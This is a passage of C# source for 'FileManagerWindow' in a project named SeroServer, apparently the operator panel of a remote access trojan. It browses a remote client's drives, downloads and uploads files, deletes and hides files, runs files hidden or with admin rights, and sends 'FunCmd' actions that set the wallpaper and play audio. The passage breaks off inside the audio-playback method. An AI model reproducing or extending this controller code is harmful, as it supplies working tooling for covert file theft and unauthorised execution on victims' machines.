using System.Collections.ObjectModel;
using System.IO;
using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FileManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly string    _tempPrefix;   // per-client prefix for preview temp files
    private readonly ObservableCollection<FileEntryVM> _entries = [];
    private readonly Stack<string> _history = new();
    private string _currentPath = "";

    // Pending async results
    private TaskCompletionSource<string>? _pendingList;
    private TaskCompletionSource<string>? _pendingData;    // Download_Click
    private TaskCompletionSource<string>? _pendingPreview; // BtnPreview_Click
    private TaskCompletionSource<string>? _pendingHash;
    private TaskCompletionSource<string>? _pendingAck;

    public FileManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridFiles);
        _server     = server;
        _clientId   = clientId;
        _tempPrefix = "sero_prev_" + string.Concat(clientId.Select(c => char.IsLetterOrDigit(c) ? c : '_')) + "_";
        TxtTitle.Text = clientLabel;
        GridFiles.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
        // FmFileData is used by both Download and Preview — route to whichever is waiting.
        // Separate fields prevent the race where a mid-download selection change overwrites
        // _pendingData with Preview's TCS, causing the download to time out.
        _server.RegisterHandler(clientId, PacketType.FmFileData,   pkt => { (_pendingData ?? _pendingPreview)?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmHashResult,  pkt => { _pendingHash?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmAck,         pkt => { _pendingAck?.TrySetResult(pkt.Data); });

        // WMF pipeline teardown (Source = null) blocks the UI thread for several seconds.
        // Fix: Stop() playback (fast), hide the window immediately, close for real on the
        // next Normal-priority tick, then retry temp-file deletion on a background thread
        // once GC finalises the MediaElement and WMF releases the file lock.
        bool _wmfCleanupDone = false;
        Closing += (s, e) =>
        {
            if (_wmfCleanupDone) return;
            e.Cancel = true;
            _wmfCleanupDone = true;
            try { PreviewVideo.Stop(); } catch { }
            Hide();
            var tmp = _previewTempFile;
            _previewTempFile = null;
            // Close on next pump tick — no Source=null so UI thread never blocks
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, () => Close());
            // Delete temp file on a background thread once WMF releases the lock
            if (tmp != null)
                _ = Task.Run(async () =>
                {
                    await Task.Delay(600);
                    GC.Collect(); GC.WaitForPendingFinalizers();
                    for (int i = 0; i < 40; i++)
                    {
                        try { System.IO.File.Delete(tmp); return; } catch { }
                        await Task.Delay(250);
                    }
                });
        };
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.FmListResult);
            _server.UnregisterHandler(clientId, PacketType.FmFileData);
            _server.UnregisterHandler(clientId, PacketType.FmHashResult);
            _server.UnregisterHandler(clientId, PacketType.FmAck);
            Lang.LanguageChanged -= ApplyLanguage;
        };
        // MediaOpened fires when WMF has fully opened the file — safe moment to call Play()
        PreviewVideo.MediaOpened += (_, _) => PreviewVideo.Play();

        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await Navigate("");  // root = drives on Windows; populates DrivesList too
        };
    }

    // ── Drives ────────────────────────────────────────

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_FILE_MANAGER");
        if (BtnBack          != null) BtnBack.Content          = Lang.Get("FM_BACK");
        if (BtnGo            != null) BtnGo.Content            = Lang.Get("FM_GO");
        if (TxtQuickAccess   != null) TxtQuickAccess.Text      = Lang.Get("FM_QUICK_ACCESS");
        if (TxtDrives        != null) TxtDrives.Text           = Lang.Get("FM_DRIVES");
        if (TxtPreviewInfo   != null && TxtPreviewInfo.Text == "Select a file") TxtPreviewInfo.Text = Lang.Get("FM_SELECT_FILE");
        if (MnuFmRefresh     != null) MnuFmRefresh.Header     = Lang.Get("ACT_REFRESH");
        if (MnuFmExecNormal  != null) MnuFmExecNormal.Header  = Lang.Get("ACT_EXEC_NORMAL");
        if (MnuFmExecHidden  != null) MnuFmExecHidden.Header  = Lang.Get("ACT_EXEC_HIDDEN");
        if (MnuFmExecAdmin   != null) MnuFmExecAdmin.Header   = Lang.Get("ACT_EXEC_ADMIN");
        if (MnuFmDownload    != null) MnuFmDownload.Header    = Lang.Get("ACT_DOWNLOAD");
        if (MnuFmUpload      != null) MnuFmUpload.Header      = Lang.Get("ACT_UPLOAD");
        if (MnuFmNewFolder   != null) MnuFmNewFolder.Header   = Lang.Get("ACT_NEW_FOLDER");
        if (MnuFmRename      != null) MnuFmRename.Header      = Lang.Get("ACT_RENAME");
        if (MnuFmDelete      != null) MnuFmDelete.Header      = Lang.Get("ACT_DELETE");
        if (MnuFmHash        != null) MnuFmHash.Header        = Lang.Get("FM_HASH");
        if (MnuFmShowHide    != null) MnuFmShowHide.Header    = Lang.Get("FM_SHOW_HIDE");
        if (MnuFmSetAttr     != null) MnuFmSetAttr.Header     = Lang.Get("FM_SET_ATTR");
        if (MnuFmWallpaper   != null) MnuFmWallpaper.Header   = Lang.Get("FM_WALLPAPER");
        if (MnuFmPlayMusic   != null) MnuFmPlayMusic.Header   = Lang.Get("FM_PLAY_MUSIC");
        if (MnuFmZip         != null) MnuFmZip.Header         = Lang.Get("FM_ZIP");
        if (MnuFmDownloadUrl != null) MnuFmDownloadUrl.Header = Lang.Get("FM_DOWNLOAD_URL");
        if (MnuFmCopyName    != null) MnuFmCopyName.Header    = Lang.Get("ACT_COPY_NAME");
        if (MnuFmCopyPath    != null) MnuFmCopyPath.Header    = Lang.Get("ACT_COPY_PATH");
    }

    // Drives are populated from Navigate("") — stub returns drive list for empty path.
    // Called by Navigate() after populating _entries.
    private void UpdateDrivesFromEntries(IEnumerable<FileEntryVM> entries)
    {
        var drives = entries
            .Where(e => e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
            .Select(e => e.Name.TrimEnd('\\', '/') + "\\")
            .ToList();
        if (drives.Count > 0)
        {
            DrivesList.Items.Clear();
            foreach (var d in drives) DrivesList.Items.Add(new DriveItemVM(d));
        }
    }

    // ── Transfer strip ────────────────────────────────

    private void ShowTransfer(string name, string status)
        => _ = Dispatcher.BeginInvoke(() =>
        {
            TxtTransferName.Text   = name.Length > 30 ? name[..30] + "…" : name;
            TxtTransferStatus.Text = status;
            TxtTransferPct.Text    = "";
            TransferStrip.Visibility = Visibility.Visible;
        });

    private void HideTransfer()
        => _ = Dispatcher.BeginInvoke(() =>
        {
            TxtTransferPct.Text = "";
            TransferStrip.Visibility = Visibility.Collapsed;
        });

    // ── Navigation ────────────────────────────────────

    private async Task Navigate(string path)
    {
        TxtStatus.Text = Lang.Get("FM_LOADING");
        try
        {
            _pendingList = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmList,
                Data = JsonConvert.SerializeObject(new FmListData { Path = path })
            });

            var json = await _pendingList.Task.WaitAsync(TimeSpan.FromSeconds(15));
            var result = JsonConvert.DeserializeObject<FmListResultData>(json);
            if (result == null) { TxtStatus.Text = Lang.Get("FM_NO_RESPONSE"); return; }
            if (!string.IsNullOrEmpty(result.Error))
            {
                var err = result.Error;
                // Strip .NET resource key prefix (e.g. "IO_PathNotFound_Path, C:\foo" → "Path not found: C:\foo")
                if (err.StartsWith("IO_PathNotFound_Path,"))     err = "Path not found: " + err[(err.IndexOf(',') + 1)..].Trim();
                else if (err.StartsWith("IO_FileNotFound,"))     err = "File not found: " + err[(err.IndexOf(',') + 1)..].Trim();
                else if (err.StartsWith("UnauthorizedAccess"))   err = "Access denied: " + err[(err.IndexOf(',') + 1)..].TrimStart();
                TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), err);
                return;
            }

            if (!string.IsNullOrEmpty(_currentPath))
                _history.Push(_currentPath);

            _currentPath = result.Path;
            TxtPath.Text = _currentPath;
            _entries.Clear();
            foreach (var e in result.Entries.OrderByDescending(x => x.IsDir).ThenBy(x => x.Name))
                _entries.Add(new FileEntryVM(e));

            // If root navigation, populate drives from the result
            if (string.IsNullOrEmpty(path) || path == "\\")
                UpdateDrivesFromEntries(_entries);

            var dirs  = result.Entries.Count(x => x.IsDir);
            var files = result.Entries.Count - dirs;
            TxtStatus.Text = string.Format(Lang.Get("FM_DIR_STAT"), result.Path, files, dirs);
            if (TxtFileCount != null)
                TxtFileCount.Text = $"{files} files — {dirs} directories";
        }
        catch (TimeoutException) { TxtStatus.Text = Lang.Get("FM_TIMEOUT"); }
        catch (Exception ex)    { TxtStatus.Text = ex.Message; }
        finally { _pendingList = null; }
    }

    // ── Context menu actions ──────────────────────────

    private async void Download_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name };
        if (dlg.ShowDialog() != true) return;

        var sw = System.Diagnostics.Stopwatch.StartNew();
        TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), row.Name);
        ServerWindow.ReportGlobalActivity("Downloading", row.Name, "running");
        ShowTransfer(row.Name, Lang.Get("FM_REQUESTING"));
        try
        {
            _pendingData = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmDownload,
                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = _currentPath.TrimEnd('\\', '/') + "\\" + row.Name })
            });
            ShowTransfer(row.Name, Lang.Get("FM_RECEIVING"));
            var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
            if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), result?.Error); return; }
            ShowTransfer(row.Name, Lang.Get("FM_DECODING"));
            // Offload Base64 decode to background thread — large files block UI if decoded inline
            var bytes = await Task.Run(() => Convert.FromBase64String(result.Data));
            TxtTransferPct.Text = "50%";
            ShowTransfer(row.Name, Lang.Get("FM_WRITING"));
            await File.WriteAllBytesAsync(dlg.FileName, bytes);
            sw.Stop();
            TxtTransferPct.Text = "100%";
            NotificationService.NotifyDownloadComplete();
            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADED"), row.Name, bytes.Length.ToString("N0"), elapsed);
            ServerWindow.ReportGlobalActivity("Download completed", row.Name, "success");
        }
        catch (Exception ex) {
            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOAD_FAILED"), ex.Message);
            ServerWindow.ReportGlobalActivity("Download failed", row.Name, "failed");
        }
        finally { _pendingData = null; HideTransfer(); }
    }

    private async void Upload_Click(object s, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
        if (dlg.ShowDialog() != true) return;
        if (string.IsNullOrEmpty(_currentPath))
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first");
            return;
        }
        var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
        var uploadName = Path.GetFileName(dlg.FileName);

        var sw = System.Diagnostics.Stopwatch.StartNew();
        TxtStatus.Text = string.Format(Lang.Get("FM_UPLOADING"), uploadName);
        ServerWindow.ReportGlobalActivity("Uploading", uploadName, "running");
        ShowTransfer(uploadName, Lang.Get("FM_READING"));
        try
        {
            var bytes = await File.ReadAllBytesAsync(dlg.FileName);
            ShowTransfer(uploadName, string.Format(Lang.Get("FM_ENCODING"), bytes.Length.ToString("N0")));
            // Base64 encoding + JSON serialisation are CPU-heavy — run off the UI thread
            // so the window stays responsive and large files don't cause a freeze/OOM crash.
            var payload = await Task.Run(() =>
                JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = Convert.ToBase64String(bytes) }));
            TxtTransferPct.Text = "50%";
            _pendingAck = new TaskCompletionSource<string>();
            ShowTransfer(uploadName, Lang.Get("FM_SENDING"));
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmUpload,
                Data = payload
            });
            await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
            sw.Stop();
            TxtTransferPct.Text = "100%";
            NotificationService.NotifyUploadComplete();
            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
            TxtStatus.Text = string.Format(Lang.Get("FM_UPLOADED"), uploadName, bytes.Length.ToString("N0"), elapsed);
            ServerWindow.ReportGlobalActivity("Upload completed", uploadName, "success");
            await Navigate(_currentPath);
        }
        catch (Exception ex) {
            TxtStatus.Text = string.Format(Lang.Get("FM_UPLOAD_FAILED"), ex.Message);
            ServerWindow.ReportGlobalActivity("Upload failed", uploadName, "failed");
        }
        finally { _pendingAck = null; HideTransfer(); }
    }

    private async void Delete_Click(object s, RoutedEventArgs e)
    {
        var selected = GridFiles.SelectedItems.Cast<FileEntryVM>().ToList();
        if (selected.Count == 0) return;
        var msg = selected.Count == 1
            ? string.Format(Lang.Get("FM_CONFIRM_DELETE_1"), selected[0].Name)
            : string.Format(Lang.Get("FM_CONFIRM_DELETE_N"), selected.Count);
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        
        int total = selected.Count;
        int successCount = 0;
        int failedCount = 0;
        string? lastError = null;

        if (total == 1)
        {
            var row = selected[0];
            var path = Path.Combine(_currentPath, row.Name);
            TxtStatus.Text = string.Format(Lang.Get("FM_DELETING"), row.Name);
            ServerWindow.ReportGlobalActivity("Delete file", row.Name, "running");
            ServerWindow.LogGlobal($"[FM] Deleting file '{path}' on client {_clientId}...");
            _pendingAck = new TaskCompletionSource<string>();
            try
            {
                await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
                var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
                var ack = JsonConvert.DeserializeObject<FmAckData>(json);
                if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
                {
                    successCount++;
                    NotificationService.NotifyFileDeleted();
                    TxtStatus.Text = string.Format(Lang.Get("FM_DELETED"), row.Name);
                    ServerWindow.ReportGlobalActivity("Delete completed", row.Name, "success");
                    ServerWindow.LogGlobal($"[FM] Deleted file '{path}' on client {_clientId}.");
                }
                else
                {
                    failedCount++;
                    lastError = ack?.Error ?? "Unknown error";
                    TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_FAILED"), lastError);
                    ServerWindow.ReportGlobalActivity("Delete failed", row.Name, "failed");
                    ServerWindow.LogGlobal($"[FM] Delete failed for '{path}' on client {_clientId}: {lastError}");
                }
            }
            catch (Exception ex)
            {
                failedCount++;
                lastError = ex.Message;
                TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_FAILED"), lastError);
                ServerWindow.ReportGlobalActivity("Delete failed", row.Name, "failed");
                ServerWindow.LogGlobal($"[FM] Delete failed for '{path}' on client {_clientId}: {lastError}");
            }
            finally { _pendingAck = null; }
        }
        else
        {
            TxtStatus.Text = string.Format(Lang.Get("FM_DELETING_N"), total);
            ServerWindow.ReportGlobalActivity("Delete items", $"{total} items", "running");
            ServerWindow.LogGlobal($"[FM] Deleting {total} items on client {_clientId}...");
            
            for (int i = 0; i < total; i++)
            {
                var row = selected[i];
                var path = Path.Combine(_currentPath, row.Name);
                TxtStatus.Text = string.Format(Lang.Get("FM_DELETING_PROGRESS"), i + 1, total, row.Name);
                
                _pendingAck = new TaskCompletionSource<string>();
                try
                {
                    await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
                    var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
                    var ack = JsonConvert.DeserializeObject<FmAckData>(json);
                    if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
                    {
                        successCount++;
                    }
                    else
                    {
                        failedCount++;
                        lastError = ack?.Error ?? "Unknown error";
                    }
                }
                catch (Exception ex)
                {
                    failedCount++;
                    lastError = ex.Message;
                }
                finally { _pendingAck = null; }
            }
            
            NotificationService.NotifyFileDeleted();
            if (failedCount == 0)
            {
                TxtStatus.Text = string.Format(Lang.Get("FM_DELETED_N"), successCount);
                ServerWindow.ReportGlobalActivity("Delete completed", $"{successCount} items", "success");
                ServerWindow.LogGlobal($"[FM] Bulk delete completed on client {_clientId}: deleted {successCount} of {total} items.");
            }
            else
            {
                TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_PARTIAL"), successCount, failedCount);
                ServerWindow.ReportGlobalActivity("Delete failed", $"{failedCount} of {total} failed", "failed");
                ServerWindow.LogGlobal($"[FM] Bulk delete finished on client {_clientId} with errors: deleted {successCount}, failed {failedCount}. Last error: {lastError}");
            }
        }
        await Navigate(_currentPath);
    }

    private async void Rename_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var newName = PromptInput(string.Format(Lang.Get("FM_RENAME_PROMPT"), row.Name), row.Name);
        if (string.IsNullOrWhiteSpace(newName) || newName == row.Name) return;
        var oldPath = Path.Combine(_currentPath, row.Name);
        var newPath = Path.Combine(_currentPath, newName);
        
        TxtStatus.Text = string.Format(Lang.Get("FM_RENAMING"), row.Name, newName);
        ServerWindow.ReportGlobalActivity("Rename item", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Renaming '{oldPath}' to '{newName}' on client {_clientId}...");
        
        _pendingAck = new TaskCompletionSource<string>();
        try
        {
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmRename, Data = JsonConvert.SerializeObject(new FmRenameData { OldPath = oldPath, NewPath = newPath }) });
            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15));
            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
            {
                TxtStatus.Text = string.Format(Lang.Get("FM_RENAMED"), row.Name, newName);
                ServerWindow.ReportGlobalActivity("Rename completed", newName, "success");
                ServerWindow.LogGlobal($"[FM] Renamed '{oldPath}' to '{newPath}' on client {_clientId}.");
            }
            else
            {
                var err = ack?.Error ?? "Unknown error";
                TxtStatus.Text = string.Format(Lang.Get("FM_RENAME_FAILED"), err);
                ServerWindow.ReportGlobalActivity("Rename failed", row.Name, "failed");
                ServerWindow.LogGlobal($"[FM] Rename failed for '{oldPath}' to '{newPath}' on client {_clientId}: {err}");
            }
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("FM_RENAME_FAILED"), ex.Message);
            ServerWindow.ReportGlobalActivity("Rename failed", row.Name, "failed");
            ServerWindow.LogGlobal($"[FM] Rename failed for '{oldPath}' to '{newPath}' on client {_clientId}: {ex.Message}");
        }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void NewFolder_Click(object s, RoutedEventArgs e)
    {
        var name = PromptInput(Lang.Get("FM_NEW_FOLDER_NAME"), Lang.Get("FM_NEW_FOLDER_DEF"));
        if (string.IsNullOrWhiteSpace(name)) return;
        var path = Path.Combine(_currentPath, name);
        
        TxtStatus.Text = string.Format(Lang.Get("FM_CREATING_FOLDER"), name);
        ServerWindow.ReportGlobalActivity("New folder", name, "running");
        ServerWindow.LogGlobal($"[FM] Creating folder '{path}' on client {_clientId}...");
        
        _pendingAck = new TaskCompletionSource<string>();
        try
        {
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmMkDir, Data = JsonConvert.SerializeObject(new FmMkDirData { Path = path }) });
            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15));
            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
            {
                TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_CREATED"), name);
                ServerWindow.ReportGlobalActivity("New folder completed", name, "success");
                ServerWindow.LogGlobal($"[FM] Created folder '{path}' on client {_clientId}.");
            }
            else
            {
                var err = ack?.Error ?? "Unknown error";
                TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_FAILED"), err);
                ServerWindow.ReportGlobalActivity("New folder failed", name, "failed");
                ServerWindow.LogGlobal($"[FM] New folder creation failed for '{path}' on client {_clientId}: {err}");
            }
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_FAILED"), ex.Message);
            ServerWindow.ReportGlobalActivity("New folder failed", name, "failed");
            ServerWindow.LogGlobal($"[FM] New folder creation failed for '{path}' on client {_clientId}: {ex.Message}");
        }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void Exec_Normal_Click(object s, RoutedEventArgs e) => await ExecFile("normal");
    private async void Exec_Hidden_Click(object s, RoutedEventArgs e) => await ExecFile("hidden");
    private async void Exec_Admin_Click(object s, RoutedEventArgs e)  => await ExecFile("runas");

    private async Task ExecFile(string mode)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);

        ServerWindow.ReportGlobalActivity("Execute file", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Executing file '{path}' (mode: {mode}) on client {_clientId}...");

        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmExec,
                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
            });
            TxtStatus.Text = string.Format(Lang.Get("FM_EXECUTED"), row.Name, mode);
            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "complete");
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "failed");
        }
    }

    private async void Hash_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        TxtStatus.Text = Lang.Get("FM_COMPUTING_HASH");
        ServerWindow.ReportGlobalActivity("Compute hash", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Requesting hash for '{path}' on client {_clientId}...");
        
        _pendingHash = new TaskCompletionSource<string>();
        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmHash,
                Data = JsonConvert.SerializeObject(new FmHashData { Path = path })
            });
            var json = await _pendingHash.Task.WaitAsync(TimeSpan.FromSeconds(30));
            var r = JsonConvert.DeserializeObject<FmHashResultData>(json);
            if (r != null && string.IsNullOrEmpty(r.Error))
            {
                try { Clipboard.SetText(r.Hash); } catch { }
                var hashPrefix = r.Hash.Length >= 16 ? r.Hash[..16] : r.Hash;
                MessageBox.Show($"SHA-256: {r.Hash}\n\n{Lang.Get("FM_COPIED_CLIPBOARD")}", row.Name, MessageBoxButton.OK, MessageBoxImage.Information);
                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_RESULT"), hashPrefix);
                ServerWindow.ReportGlobalActivity("Hash completed", row.Name, "success");
                ServerWindow.LogGlobal($"[FM] Hash computed for '{path}' on client {_clientId}: {r.Hash}");
            }
            else
            {
                var err = r?.Error ?? "Unknown error";
                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_ERROR"), err);
                ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
                ServerWindow.LogGlobal($"[FM] Hash computation failed for '{path}' on client {_clientId}: {err}");
            }
        }
        catch (Exception ex)
        {
            TxtStatus.Text = Lang.Get("FM_HASH_TIMEOUT");
            ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
            ServerWindow.LogGlobal($"[FM] Hash computation failed/timed out for '{path}' on client {_clientId}: {ex.Message}");
        }
        finally { _pendingHash = null; }
    }

    private async void ShowHide_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        var targetAction = row.IsHidden ? "Show file" : "Hide file";

        ServerWindow.ReportGlobalActivity(targetAction, row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Setting hidden attribute to {!row.IsHidden} for '{path}' on client {_clientId}...");

        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmShowHide,
                Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
            });
            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "complete");
            await Navigate(_currentPath);
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "failed");
        }
    }

    private async void SetAttr_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        var current = (System.IO.FileAttributes)row.AttributesRaw;
        var newAttrs = ShowAttrDialog(row.Name, current);
        if (newAttrs == null) return;
        
        TxtStatus.Text = string.Format(Lang.Get("FM_SETTING_ATTR"), row.Name);
        ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Setting attributes for '{path}' to {newAttrs.Value} on client {_clientId}...");
        
        _pendingAck = new TaskCompletionSource<string>();
        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmSetAttr,
                Data = JsonConvert.SerializeObject(new FmSetAttrData { Path = path, Attributes = (int)newAttrs.Value })
            });
            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
            {
                ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "success");
                ServerWindow.LogGlobal($"[FM] Attributes set successfully for '{path}' on client {_clientId}.");
            }
            else
            {
                var err = ack?.Error ?? "Unknown error";
                ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "failed");
                ServerWindow.LogGlobal($"[FM] Set attributes failed for '{path}' on client {_clientId}: {err}");
            }
        }
        catch (Exception ex)
        {
            ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "failed");
            ServerWindow.LogGlobal($"[FM] Set attributes failed/timed out for '{path}' on client {_clientId}: {ex.Message}");
        }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private static System.IO.FileAttributes? ShowAttrDialog(string fileName, System.IO.FileAttributes current)
    {
        var dlg = new Window
        {
            Title = Lang.Get("FM_SET_ATTRS"), Width = 280, Height = 200,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = fileName, Foreground = System.Windows.Media.Brushes.Gray,
            FontSize = 10, Margin = new Thickness(0, 0, 0, 10),
            TextTrimming = System.Windows.TextTrimming.CharacterEllipsis
        });
        System.IO.FileAttributes[] flags = [
            System.IO.FileAttributes.ReadOnly,
            System.IO.FileAttributes.Hidden,
            System.IO.FileAttributes.System,
            System.IO.FileAttributes.Archive,
        ];
        var boxes = new List<System.Windows.Controls.CheckBox>();
        foreach (var f in flags)
        {
            var cb = new System.Windows.Controls.CheckBox
            {
                Content = f.ToString(),
                IsChecked = current.HasFlag(f),
                Foreground = System.Windows.Media.Brushes.White,
                Margin = new Thickness(0, 2, 0, 2),
            };
            sp.Children.Add(cb);
            boxes.Add(cb);
        }
        var ok = new System.Windows.Controls.Button
        {
            Content = Lang.Get("DLG_APPLY"), Width = 70, HorizontalAlignment = HorizontalAlignment.Right,
            Margin = new Thickness(0, 10, 0, 0), Padding = new Thickness(10, 4, 10, 4)
        };
        ok.Click += (_, _) => { dlg.DialogResult = true; };
        sp.Children.Add(ok);
        dlg.Content = sp;
        if (dlg.ShowDialog() != true) return null;
        System.IO.FileAttributes result = 0;
        for (int i = 0; i < flags.Length; i++)
            if (boxes[i].IsChecked == true) result |= flags[i];
        return result;
    }

    private async void Wallpaper_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);

        ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Setting wallpaper to '{path}' on client {_clientId}...");

        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FunCmd,
                Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
            });
            TxtStatus.Text = string.Format(Lang.Get("FM_WALLPAPER_SET"), row.Name);
            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "complete");
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "failed");
        }
    }

    private async void PlayMusic_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);

        ServerWindow.ReportGlobalActivity("Play audio", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Playing audio file '{path}' on client {_clientId}...");

        try
        {
